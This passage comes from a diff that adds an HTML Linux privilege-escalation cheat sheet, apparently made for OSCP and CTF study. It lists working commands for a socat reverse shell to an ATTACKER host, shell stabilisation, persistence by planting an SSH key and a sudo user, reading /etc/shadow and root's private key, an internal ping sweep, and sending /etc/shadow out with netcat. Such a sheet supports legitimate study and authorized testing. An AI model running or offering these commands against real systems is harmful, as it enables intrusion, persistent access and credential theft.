+      <code class="cmd"><span class="comment"># socat full TTY:</span></code>
+      <code class="cmd"><span class="comment"># Attacker:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>socat file:`tty`,raw,echo=0 tcp-listen:4444</code>
+      <code class="cmd"><span class="comment"># Victim:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444</code>
+    </div>
+
+    <div class="card green">
+      <div class="card-title"><span class="dot"></span>Script Method</div>
+      <code class="cmd"><span class="prompt">$ </span>script /dev/null -c bash</code>
+      <code class="cmd">Ctrl+Z</code>
+      <code class="cmd"><span class="prompt">$ </span>stty raw -echo; fg</code>
+      <code class="cmd"><span class="prompt">$ </span>reset</code>
+      <code class="cmd"><span class="prompt">$ </span>export SHELL=bash TERM=xterm-256color</code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 13: POST EXPLOIT ── -->
+  <div class="section-label">12 · Post Exploitation</div>
+  <div class="grid grid-3">
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>Persistence</div>
+      <code class="cmd"><span class="comment"># Add SSH key:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>mkdir -p /root/.ssh</code>
+      <code class="cmd"><span class="prompt">$ </span>echo "ATTACKER_PUB_KEY" >> /root/.ssh/authorized_keys</code>
+      <code class="cmd"><span class="comment"># Add root user:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>useradd -m -s /bin/bash -G sudo evil</code>
+      <code class="cmd"><span class="prompt">$ </span>passwd evil</code>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>Loot &amp; Pivoting</div>
+      <code class="cmd"><span class="prompt">$ </span>cat /etc/shadow</code>
+      <code class="cmd"><span class="prompt">$ </span>cat /root/.ssh/id_rsa</code>
+      <code class="cmd"><span class="prompt">$ </span>find /home -name "*.txt" -o -name "*.conf" 2>/dev/null</code>
+      <code class="cmd"><span class="comment"># Internal network recon:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>for i in {1..254}; do ping -c1 192.168.1.$i &>/dev/null && echo "UP: 192.168.1.$i"; done</code>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>Data Exfil</div>
+      <code class="cmd"><span class="comment"># Python HTTP server:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>python3 -m http.server 8888</code>
+      <code class="cmd"><span class="comment"># SCP:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>scp user@TARGET:/etc/shadow .</code>
+      <code class="cmd"><span class="comment"># Netcat:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>nc -w3 ATTACKER 9999 < /etc/shadow</code>
+    </div>
+
+  </div>
+
+  <!-- ── CHECKLIST ── -->
+  <div class="divider">Quick Checklist</div>
+  <div class="grid grid-4">
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>Phase 1: Land</div>
+      <ul class="checklist">
+        <li>Stabilize shell</li>
+        <li>Get OS/kernel version</li>
+        <li>Get current user/groups</li>
+        <li>Check sudo -l</li>
+        <li>Run LinPEAS / pspy</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>Phase 2: Enumerate</div>
+      <ul class="checklist">
+        <li>SUID/SGID binaries</li>
+        <li>Cron jobs</li>
+        <li>Writable files/dirs</li>
+        <li>Capabilities</li>
+        <li>NFS exports</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>Phase 3: Credential Hunt</div>
+      <ul class="checklist">
+        <li>bash_history</li>
+        <li>Config/env files</li>
+        <li>SSH keys</li>
+        <li>Database passwords</li>
+        <li>shadow readable?</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>Phase 4: Exploit</div>
+      <ul class="checklist">
+        <li>GTFOBins lookup</li>
+        <li>Kernel CVE check</li>
+        <li>PATH hijacking</li>
+        <li>Docker/LXD group</li>
+        <li>Get root shell!</li>
+      </ul>
+    </div>
+  </div>
+
+</div><!-- /page -->
+
+<div class="footer">
+  4JAI NOTES &nbsp;·&nbsp; Linux PrivEsc Cheat Sheet &nbsp;·&nbsp; <span>For Educational &amp; Authorized Use Only</span> &nbsp;·&nbsp; OSCP / CRTP / CTF
+</div>
+
+</body>
+</html>
